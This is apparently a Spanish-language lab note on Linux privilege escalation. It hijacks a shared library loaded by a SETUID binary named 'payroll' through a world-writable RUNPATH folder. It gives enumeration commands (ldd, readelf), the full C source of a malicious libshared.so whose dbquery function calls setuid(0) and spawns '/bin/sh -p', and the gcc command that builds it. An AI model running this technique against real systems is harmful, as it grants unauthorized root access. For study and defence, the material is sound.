

Los programas y binarios en desarrollo suelen tener bibliotecas personalizadas asociadas. Considera este binario con SETUID

```
ls -la payroll
```
![[Pasted image 20260921161508.png]]

Podemos usar `ldd` para imprimir el objeto compartido que requiere este binario. Mostrara la ubicacion del objeto y direccion hexadecimal donde se carga en memorio

```
ldd payroll
```
![[Pasted image 20260921161652.png]]

Aqui podemos ver una biblioteca NO ESTANDAR `libshared.so`. Como se sabe, se pueden cargar bibliotecas desde ubicaciones personalizadas y una de las formas es con RUNPATH

Si usamos `readdelf` podemos ver que podemos cargar bibliotecas desde la carpeta /development que es escribible por todos:

```
readelf -d payroll | grep PATH
```
![[Pasted image 20260921161918.png]]

```
ls -la /development/
```
![[Pasted image 20260921161927.png]]

	Podremos colocar una biblioteca maliciosa en /development que tendra preferencia sobre el resto

Antes de compilar una biblioteca debemos encontrar el nombre de la funcion que es llamda por el binario

```
ldd payroll
```
![[Pasted image 20260921162054.png]]

Podemos copiar una biblioteca random en development sobre la biblioteca que usa el binario. Tras ejecutarlo da un error que indica que no se pudo encontrar la funcion dbquery

```
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```
![[Pasted image 20260921162427.png]]![[Pasted image 20260921162432.png]]

Compilamos el objeto compartido para que incluya dbquery (establece nuestro id de usuario en 0 y ejecuta /bin/shj):

```
#include<stdio.h> 
#include<stdlib.h> 
#include<unistd.h> 

void dbquery() { 
	printf("Malicious library loaded\n"); 
	setuid(0); 
	system("/bin/sh -p"); 
}
```
![[Pasted image 20260921162528.png]]

```
gcc src.c -fPIC -shared -o /development/libshared.so
```

Ejecutamos el binario

![[Pasted image 20260921162621.png]]
